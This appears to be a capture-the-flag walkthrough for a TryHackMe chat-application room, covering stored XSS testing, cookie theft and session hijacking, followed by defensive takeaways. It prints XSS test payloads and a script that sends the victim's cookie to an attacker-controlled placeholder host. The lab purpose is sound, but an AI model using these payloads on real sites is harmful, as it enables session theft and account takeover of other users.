# 💬 Speed Chatting — TryHackMe Walkthrough

**Room:** [Speed Chatting](https://tryhackme.com/room/speedchatting)
**Difficulty:** Easy
**Category:** Web / XSS / Injection
**Tags:** XSS, Cross-Site Scripting, WebSockets, Chat Application

---

## 📋 Overview

Speed Chatting is a web exploitation room involving a real-time chat application. The challenge focuses on finding and exploiting vulnerabilities in the chat functionality — typically **Cross-Site Scripting (XSS)** or related injection flaws.

---

## 🔧 Tools Used

- Browser / Burp Suite — Request interception
- Browser DevTools — Inspecting WebSocket messages and cookies

---

## 🌐 Step 1: Explore the Application

Navigate to `http://<TARGET_IP>`. You'll find a chat application. Register or log in and send messages to understand how the application handles user input.

---

## 🔍 Step 2: Test for XSS

Try injecting a basic XSS payload in the chat message field:

```html
<script>alert('XSS')</script>
```

If an alert box appears, **reflected or stored XSS** is confirmed.

Also test:

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

## 🍪 Step 3: Cookie Theft via XSS

If the admin or another user views the chat, steal their session cookie:

Set up a listener (e.g., using Burp Collaborator or a simple server):

```bash
python3 -m http.server 8080
```

Inject the payload:

```html
<script>document.location='http://<YOUR_IP>:8080/?c='+document.cookie</script>
```

When the admin views the message, their browser sends their cookie to your server.

---

## 🚩 Step 4: Session Hijacking / Flag

Use the stolen cookie to log in as the admin:

1. Open DevTools → Application → Cookies
2. Replace your cookie with the stolen value
3. Refresh the page

Access the admin panel to find the flag.

> 🚩 **Flag:** Obtained via XSS → cookie theft → session hijacking.

---

## 📝 Key Takeaways

- **Stored XSS** in chat applications is particularly dangerous — all users who view the chat are affected.
- The `HttpOnly` cookie flag prevents JavaScript from reading cookies, blocking this attack.
- **Content Security Policy (CSP)** can restrict where scripts can load from.
- Input sanitisation and output encoding prevent XSS: encode `<`, `>`, `"`, `'`, `&`.

---

## 🔗 References

- [OWASP — XSS](https://owasp.org/www-community/attacks/xss/)
- [TryHackMe — Speed Chatting Room](https://tryhackme.com/room/speedchatting)
- [Walkthrough Reference](https://medium.com/@sudoroot523/tryhackme-speed-chatting-cd24c0288c54)
